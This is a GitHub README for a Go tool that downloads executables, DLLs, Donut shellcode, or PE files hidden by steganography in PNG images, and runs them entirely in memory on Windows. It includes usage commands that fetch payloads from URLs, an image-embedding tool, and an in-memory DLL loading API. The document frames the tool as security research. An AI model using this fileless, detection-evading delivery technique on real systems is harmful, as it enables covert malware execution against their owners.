# pure go http memexec
[![Go CI](https://github.com/carved4/pure-go-http-memexec/actions/workflows/go.yml/badge.svg)](https://github.com/carved4/pure-go-http-memexec/actions/workflows/go.yml)

A lightweight, memory-safe Windows PE file execution tool that downloads and executes payloads without ever touching the disk. Supports executables, DLLs, shellcode (Donut format), and PE files embedded in PNG images.


## Features

- **Zero Disk I/O**: Downloads executables directly to memory and never writes them to disk
- **Pure Go Implementation**: 100% Go code with no CGO dependencies (thank you binject/debug you guys are truly the goats)
- **Memory-Safe Execution**: Implements proper memory protection and relocation
- **TLS Callback Support**: Properly handles TLS callbacks in PE files
- **DLL Support**: Can load DLLs in memory and call exported functions
- **Shellcode Support**: Execute Donut-generated shellcode directly in memory
- **Steganography Support**: Extract and execute PE files embedded in PNG images
- **Simple API**: Single command to download and execute payloads

[find binject debug here](https://github.com/Binject/debug)
## How It Works

go http memexec uses a sophisticated reflective PE loading technique to run executables in memory:

1. Downloads a PE file directly to memory using golang's net/http
2. Parses the PE file structure using the Binject/debug/pe package
3. Maps the PE file into memory with proper section permissions
4. Resolves imports and fixes relocations
5. Handles TLS callbacks properly
6. For EXEs: Executes the payload by jumping to its entry point
7. For DLLs: Calls DllMain with DLL_PROCESS_ATTACH and lets you call exported functions
8. For PNGs: Extracts the embedded donut shellcode from the PNG and runs it as a thread under the same PID

## Usage

```bash
# Basic usage with default URL (EXE mode)
./go-http-memexec

# Specify a custom download URL (EXE mode)
./go-http-memexec https://example.com/payload.exe

# Load a DLL into memory
./go-http-memexec -dll https://example.com/payload.dll

# Load a DLL and call an exported function by name
./go-http-memexec -dll -proc=RunPayload https://example.com/payload.dll

# Load a DLL and call an exported function by ordinal
./go-http-memexec -dll -ordinal=5 https://example.com/payload.dll

# Execute shellcode (Donut format only)
./go-http-memexec -shellcode https://example.com/shellcode.bin

# Extract and execute PE from PNG image
./go-http-memexec -image https://example.com/payload.png

# Extract and execute donut shellcode from PNG image
./go-http-memexec -image -shellcode https://example.com/payload.png
```

## Use Cases

- Security testing and research
- Memory-resident application deployment
- Advanced Windows process manipulation research
- Fileless payload execution
- Loading DLLs without registering them in the PEB loader list
- Steganographic payload delivery
- Shellcode execution from memory


## Build Instructions

```bash
# Clone repo 
git clone https://github.com/carved4/pure-go-http-memexec.git

# Navigate to directory
cd pure-go-http-memexec

# Get dependencies
go mod tidy

# Navigate to folder containing main.go
cd cmd

# Build the executable
go build -ldflags="-s -w" -trimpath -o go-http-memexec.exe
```

## DLL Loading API

The package provides the following functions for DLL handling:

```go
// Load a DLL into memory
handle, err := runpe.LoadDLLInMemory(dllBytes)

// Get address of an exported function by name
procAddr, err := runpe.GetProcAddressFromMemoryDLL(handle, "ExportedFunctionName")

// Get address of an exported function by ordinal
procAddr, err := runpe.GetProcAddressByOrdinalFromMemoryDLL(handle, 5) // Ordinal 5

// Call the function
syscall.Syscall(procAddr, numArgs, arg1, arg2, arg3)

// Free the DLL when done
err = runpe.FreeDLLFromMemory(handle, 0)
```

## Security Considerations

This tool is designed for legitimate security research, testing, and educational purposes only. The ability to execute code directly from memory without touching disk is a powerful capability that should be used responsibly.

## Requirements

- Windows operating system
- Go 1.20 or later

## Notes
- This project has only been tested on Windows 10
- This is a rewrite of the original C++-based implementation, now in 100% pure Go
- The DLL loading functionality allows more flexible in-memory execution without process hollowing

## Shellcode Support

The `-shellcode` flag enables execution of shellcode directly in memory. **Important notes**:

- **Only Donut-generated shellcode is supported**
- Recommended Donut parameters: `-x 3` and `-e 3`
- The shellcode is executed in a new thread within the current process
- The main process will wait for user input before exiting, allowing the shellcode to run

## PNG Embedding

The `-image` flag enables extraction and execution of PE files embedded in PNG images:

- PE files are embedded using the included `embedPEpng` tool
- The embedding uses LSB (Least Significant Bit) steganography
- The tool automatically detects and extracts the PE file from the PNG
- After extraction, the PE is executed according to its type (EXE or DLL)

### Using the embedPEpng Tool

```bash
# Embed a PE file into a PNG image
./embedPEpng -i source.png -pe payload.exe -o output.png
```

## Demo Usage of tests (payloads pulled down in this example write a benign indicator of success as a .txt to a temp dir)
https://github.com/user-attachments/assets/fbf58f99-fc74-41af-a96a-5ea01bc0c2aa

## Contributing

Users are encouraged to submit issues and create forks of this project for their own use or to contribute improvements. When working with this codebase, please note:

- This project uses the BSD-3-Clause license, as does the Binject/debug/pe dependency
- When creating forks, please maintain the same license terms
- Contributions via pull requests are welcome
- Please give proper attribution and do not claim this work as your own
- When reusing portions of this code in other projects, ensure you comply with the BSD-3-Clause licensing requirements

## License

 [License: BSD-3-Clause](LICENSE)

## Disclaimer

This project is provided for educational and research purposes only. Users are responsible for ensuring compliance with all applicable laws and regulations.



